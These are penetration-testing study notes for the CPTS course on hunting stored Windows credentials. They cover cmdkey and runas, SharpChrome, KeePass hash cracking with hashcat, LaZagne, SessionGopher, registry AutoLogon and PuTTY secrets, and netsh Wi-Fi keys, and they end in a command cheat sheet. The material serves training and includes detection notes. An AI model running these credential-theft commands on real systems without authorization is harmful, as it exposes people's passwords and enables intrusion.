This section expands credential hunting into **stored credentials and credential-recovery mechanisms**. The main lesson is that credentials can be stored by Windows itself, browsers, password managers, remote-access tools, registry settings, and even wireless profiles.

For CPTS, think of the workflow as:

```text
Windows foothold
      │
      ▼
Find stored credentials
      │
      ├── Cmdkey / Credential Manager
      ├── Browser credentials
      ├── Password managers
      ├── Email
      ├── LaZagne
      ├── SessionGopher
      ├── Registry
      │     ├── AutoLogon
      │     └── PuTTY
      └── Wi-Fi profiles
             │
             ▼
       Credentials recovered
             │
       ┌─────┴─────┐
       ▼           ▼
 Privilege      Lateral
 escalation     movement
```

---

# 1. `cmdkey` — Saved Credentials

Windows provides:

```cmd
cmdkey
```

for creating, listing, and deleting stored usernames/passwords.

Users may save credentials for:

- Remote systems
    
- RDP/Terminal Services
    
- Other network resources
    

This can become useful because a low-privileged user may have credentials saved for a **different, more privileged account**.

---

## Enumerating Saved Credentials

Run:

```cmd
cmdkey /list
```

Example:

```text
Target: LegacyGeneric:target=TERMSRV/SQL01
Type: Generic
User: inlanefreight\bob
```

The important discovery is:

```text
TERMSRV/SQL01
        │
        ▼
inlanefreight\bob
```

This tells you that saved credentials exist for an RDP/Terminal Services target.

### CPTS mental model

```text
cmdkey /list
      │
      ▼
Saved target
      │
      ▼
Saved username
      │
      ▼
Potential alternate account
      │
      ▼
RDP / runas / lateral movement
```

---

# 2. `runas /savecred`

The source shows that saved credentials can potentially be reused with:

```powershell
runas /savecred /user:inlanefreight\bob "COMMAND HERE"
```

The idea is:

```text
Current user
     │
     ▼
Saved credentials
     │
     ▼
runas /savecred
     │
     ▼
Execute command as another user
```

Depending on the situation, the command could be a:

- CMD shell
    
- PowerShell session
    
- Binary
    
- Reverse shell in an authorized lab
    

The important CPTS concept is **credential reuse**, not just RDP.

---

# 3. Browser Credentials

Modern browsers often allow users to save passwords.

The source specifically demonstrates **Chrome**.

A user's saved browser credentials can potentially contain access to:

```text
Internal websites
Admin panels
vCenter
VPN portals
Cloud services
Other applications
```

---

# 4. SharpChrome

The source uses:

```powershell
.\SharpChrome.exe logins /unprotect
```

The tool can retrieve Chrome cookies and saved logins.

Example output identifies:

```text
AES state key file:
C:\Users\bob\AppData\Local\Google\Chrome\User Data\Local State
```

and the Chrome credential database:

```text
C:\Users\bob\AppData\Local\Google\Chrome\User Data\Default\Login Data
```

The source's example ultimately recovers:

```text
Username:
bob@inlanefreight.local

Password:
Welcome1
```

---

# 5. Browser Credential Mental Model

Think:

```text
Chrome
  │
  ├── Local State
  │      ↓
  │   Encryption state/key material
  │
  └── Login Data
         ↓
      Saved logins
```

Then:

```text
Saved browser credential
          ↓
Credential recovery
          ↓
Internal application
          ↓
Potential new access
```

### Important

Browser credential collection can generate detectable activity.

The source specifically mentions potential Windows events such as:

```text
4688  → Process creation
16385 → DPAPI activity
4662  → Object access
4663  → File access
```

Defenders can use these events to improve detection of credential collection.

---

# 6. Password Managers

Password managers are extremely valuable targets because they can contain **many credentials in one place**.

The source gives examples:

```text
KeePass
1Password
Thycotic
CyberArk
```

An IT administrator's password manager could contain credentials for:

```text
Servers
Network devices
Databases
VPNs
Admin portals
Infrastructure
```

Therefore:

```text
One password manager
        ↓
Potentially many credentials
        ↓
Multiple systems
```

---

# 7. KeePass `.kdbx`

KeePass databases commonly use:

```text
.kdbx
```

If you discover:

```text
something.kdbx
```

you should recognize:

> **This is potentially a KeePass password database.**

The source explains that a KeePass database may be protected by a master password.

---

# 8. Extracting a KeePass Hash

The source uses:

```bash
python2.7 keepass2john.py ILFREIGHT_Help_Desk.kdbx
```

This produces a KeePass-formatted hash:

```text
$keepass$...
```

The purpose is:

```text
.kdbx
  ↓
keepass2john
  ↓
KeePass hash
  ↓
Offline password cracking
  ↓
Master password
  ↓
KeePass database
  ↓
Stored credentials
```

---

# 9. Offline Cracking

The source uses Hashcat mode:

```text
13400
```

Command:

```bash
hashcat -m 13400 keepass_hash /opt/useful/seclists/Passwords/Leaked-Databases/rockyou.txt
```

The example successfully recovers the master password.

### CPTS point

The important technique is:

```text
Extract hash
    ↓
Crack offline
    ↓
Recover master password
    ↓
Open credential database
```

Offline cracking is preferable to repeatedly guessing against a live service because you aren't generating authentication attempts against the target.

---

# 10. Why Password Managers Are High Impact

Imagine:

```text
IT Administrator
      │
      ▼
KeePass
      │
      ├── Domain Admin
      ├── Firewall
      ├── Switch
      ├── vCenter
      ├── SQL Server
      └── Linux servers
```

One compromised password database can therefore expose multiple environments.

The source specifically highlights the possibility of accessing network devices, servers, databases, and other high-value systems.

---

# 11. Email Credential Hunting

If you obtain access to a domain-joined system as a domain user with a Microsoft Exchange mailbox, the source suggests searching email for terms such as:

```text
pass
creds
credentials
```

The referenced tool is:

```text
MailSniper
```

### Why email?

Administrators and users sometimes send:

```text
Temporary passwords
VPN credentials
Server credentials
Configuration information
Password reset information
```

through email.

So:

```text
Mailbox
   ↓
Search sensitive terms
   ↓
Find credential-related messages
   ↓
Potential new access
```

---

# 12. LaZagne

When manual searches don't find anything, the source introduces:

```text
LaZagne
```

LaZagne searches multiple applications and credential-storage mechanisms.

The source lists areas including:

```text
Browsers
Chat clients
Databases
Email
Memory
Sysadmin tools
Autologon
Credential Manager
DPAPI
LSA secrets
```

---

# 13. LaZagne Help

```powershell
.\lazagne.exe -h
```

The available modules include:

```text
chats
mails
all
git
svn
windows
wifi
maven
sysadmin
browsers
games
multimedia
memory
databases
php
```

---

# 14. Run All LaZagne Modules

The source demonstrates:

```powershell
.\lazagne.exe all
```

This searches supported applications for stored credentials.

Example results include:

```text
WinSCP passwords
Credman passwords
```

with:

```text
URL
Username
Password
Port
```

This demonstrates why credential-hunting tools can quickly uncover credentials that manual searches might miss.

---

# 15. SessionGopher

Another useful tool from this section:

```text
SessionGopher
```

It searches for saved credentials/session information associated with:

```text
PuTTY
WinSCP
FileZilla
SuperPuTTY
RDP
```

It can also search for:

```text
.ppk
.rdp
.sdtid
```

files.

---

# 16. SessionGopher — Important Privilege Requirement

The source makes an important distinction.

To retrieve stored session information for **every user** in:

```text
HKEY_USERS
```

you need:

```text
Local Administrator
```

But you should still run it as your current user first because it may find useful credentials belonging to that user.

### CPTS workflow

```text
Low privilege
    │
    ▼
Run SessionGopher
    │
    ▼
Find current user's credentials
    │
    ▼
Privilege escalation
    │
    ▼
Run again as admin
    │
    ▼
Search other users
```

This is a very important **"re-enumerate after privilege escalation"** concept.

---

# 17. SessionGopher Example

The source finds:

```text
PuTTY Session
    ↓
nix03.inlanefreight.local
```

and:

```text
SuperPuTTY
    ↓
nix03.inlanefreight.local
    ↓
Username: srvadmin
    ↓
Port: 22
```

So even when a password isn't immediately exposed, you may learn:

```text
Target
Username
Protocol
Port
Session information
```

which can become useful for further enumeration.

---

# 18. Cleartext Credentials in Registry

🔥 Another major CPTS topic.

Some applications and Windows configurations can store credentials in the registry.

The source emphasizes that even though tools like LaZagne and SessionGopher exist, penetration testers should understand how to enumerate these manually.

Two examples:

```text
Windows AutoLogon
PuTTY
```

---

# 19. Windows AutoLogon

Windows AutoLogon allows the machine to automatically log into a specific account at startup.

The convenience comes with a security consequence:

> The configured username and password can be stored in the registry in cleartext.

Registry location:

```text
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon
```

The source notes that standard users can access this registry location.

---

# 20. Important AutoLogon Registry Values

Remember these three:

```text
AutoAdminLogon
DefaultUserName
DefaultPassword
```

### `AutoAdminLogon`

Determines whether AutoLogon is enabled.

```text
1 = enabled
```

### `DefaultUserName`

Contains the account used for automatic logon.

### `DefaultPassword`

Contains the password.

---

# 21. Enumerating AutoLogon

Command:

```cmd
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
```

Example:

```text
AutoAdminLogon    REG_SZ    1
DefaultUserName   REG_SZ    htb-student
DefaultPassword   REG_SZ    HTB_@cademy_stdnt!
```

So:

```text
AutoLogon enabled
       ↓
Username discovered
       ↓
Password discovered
```

---

# 22. Defensive Note — Sysinternals Autologon

The source recommends:

```text
Autologon.exe
```

from Sysinternals if AutoLogon is absolutely necessary.

It stores the password as an **LSA secret** rather than directly as a plaintext registry value.

---

# 23. PuTTY Credentials

PuTTY is another interesting target.

For PuTTY sessions using a proxy connection, saved credentials can be stored in the registry in cleartext.

Registry location:

```text
HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions\<SESSION NAME>
```

---

# 24. Important `HKCU` vs `HKEY_USERS` Concept

This is an important Windows concept.

If you're logged in as the user who created the PuTTY session:

```text
HKCU
```

contains their configuration.

If you have administrator privileges, you can potentially inspect corresponding user hives under:

```text
HKEY_USERS
```

The source specifically explains that access controls for the PuTTY key are tied to the user who configured the session.

### Mental model

```text
Current user
    ↓
HKCU
    ↓
Current user's PuTTY sessions


Administrator
    ↓
HKEY_USERS
    ↓
Other loaded/user registry hives
```

---

# 25. Enumerating PuTTY Sessions

First:

```powershell
reg query HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions
```

Example:

```text
kali%20ssh
```

Then inspect it:

```powershell
reg query HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions\kali%20ssh
```

The source's example contains:

```text
ProxyHost      proxy
ProxyPort      80
ProxyUsername  administrator
ProxyPassword  1_4m_th3_@cademy_4dm1n!
```

---

# 26. Why PuTTY Proxy Credentials Matter

The scenario is:

```text
Administrator
      │
      ▼
Configures PuTTY
      │
      ▼
Uses admin credentials for proxy
      │
      ▼
Credentials saved
      │
      ▼
Attacker discovers registry values
      │
      ▼
Potential credential reuse
```

The source explicitly notes that the recovered password could potentially be reused elsewhere in the network.

---

# 27. Wi-Fi Passwords

The final technique in this section is saved wireless credentials.

The source assumes:

```text
Local Administrator
+
Wireless card
```

and then enumerates wireless profiles.

---

# 28. List Saved Wi-Fi Networks

Command:

```cmd
netsh wlan show profile
```

Example:

```text
All User Profile : Smith Cabin
All User Profile : Bob's iPhone
All User Profile : EE_Guest
All User Profile : EE_Guest 2.4
All User Profile : ilfreight_corp
```

This tells us which wireless networks have saved profiles.

---

# 29. Retrieve a Saved Wi-Fi Password

The source uses:

```cmd
netsh wlan show profile ilfreight_corp key=clear
```

The interesting field is:

```text
Key Content
```

Example:

```text
Key Content : ILFREIGHTWIFI-CORP123908!
```

---

# 30. Why Wi-Fi Credentials Can Matter

The point isn't necessarily:

> "I found a Wi-Fi password."

The bigger question is:

> **What network does this credential provide access to?**

For example:

```text
Corporate Wi-Fi
      ↓
Different network segment
      ↓
Additional hosts/services
      ↓
Potential additional attack surface
```

The source specifically notes that this can sometimes provide access to a separate wireless network and additional resources.

---

# 🔥 CPTS Credential Theft Cheat Sheet

## Cmdkey

```cmd
cmdkey /list
```

Run command as saved user:

```powershell
runas /savecred /user:<DOMAIN>\<USER> "COMMAND"
```

---

## Chrome

Source technique:

```powershell
.\SharpChrome.exe logins /unprotect
```

Interesting locations:

```text
Chrome\User Data\Local State
Chrome\User Data\Default\Login Data
```

---

## KeePass

Identify:

```text
*.kdbx
```

Extract hash:

```bash
python2.7 keepass2john.py database.kdbx
```

Hashcat:

```bash
hashcat -m 13400 keepass_hash wordlist
```

---

## LaZagne

Help:

```powershell
.\lazagne.exe -h
```

All modules:

```powershell
.\lazagne.exe all
```

---

## SessionGopher

```powershell
Import-Module .\SessionGopher.ps1
```

```powershell
Invoke-SessionGopher -Target <TARGET>
```

Interesting targets:

```text
PuTTY
WinSCP
FileZilla
SuperPuTTY
RDP
```

---

## AutoLogon

```cmd
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
```

Look for:

```text
AutoAdminLogon
DefaultUserName
DefaultPassword
```

---

## PuTTY

List sessions:

```cmd
reg query HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions
```

Inspect:

```cmd
reg query HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions\<SESSION>
```

Look for:

```text
ProxyUsername
ProxyPassword
```

---

## Wi-Fi

List profiles:

```cmd
netsh wlan show profile
```

Show saved key:

```cmd
netsh wlan show profile <PROFILE> key=clear
```

Look for:

```text
Key Content
```

---

# 🧠 The CPTS Credential-Hunting Matrix

|Location|What you're looking for|Technique|
|---|---|---|
|Credential Manager|Saved credentials|`cmdkey`|
|Chrome|Saved logins|SharpChrome|
|KeePass|Password database|`.kdbx` → hash → offline cracking|
|Exchange|Credential-containing emails|MailSniper|
|Applications|Stored credentials|LaZagne|
|PuTTY/WinSCP/etc.|Saved sessions|SessionGopher|
|Registry|AutoLogon|`reg query`|
|Registry|PuTTY proxy credentials|`reg query`|
|Wi-Fi|Saved wireless keys|`netsh wlan`|

---

# 🔥 Most Important CPTS Mental Model

Don't stop after finding one credential.

Every credential should trigger:

```text
                  CREDENTIAL
                      │
          ┌───────────┼───────────┐
          ▼           ▼           ▼
       WHO IS IT?  WHERE USED?  WHAT ACCESS?
          │           │           │
          ▼           ▼           ▼
       username    hostname     local admin?
       domain      service      domain user?
       role        protocol     server access?
                      │           │
                      └─────┬─────┘
                            ▼
                     Validate access
                            │
                 ┌──────────┴──────────┐
                 ▼                     ▼
          Privilege escalation    Lateral movement
```

For example:

```text
Found:
administrator / password

        ↓

Is it local or domain?

        ↓

Where can it authenticate?

        ↓

Does it provide admin privileges?

        ↓

Can it access another host?

        ↓

Does that host expose something
more valuable?
```

That is the **CPTS mindset**.

### The biggest takeaway from this section

**Credentials can be stored almost anywhere.**

```text
Windows
 ├── Credential Manager
 ├── Registry
 ├── Wi-Fi profiles
 └── AutoLogon

Applications
 ├── Chrome
 ├── PuTTY
 ├── WinSCP
 ├── FileZilla
 └── KeePass

Communication
 └── Email

Files
 ├── .kdbx
 ├── .ppk
 └── .rdp

Tools
 ├── LaZagne
 └── SessionGopher
```

So your post-exploitation routine should become:

> **Enumerate manually → use specialized tools → re-enumerate after privilege escalation → correlate discovered credentials with accounts, hosts, and services.**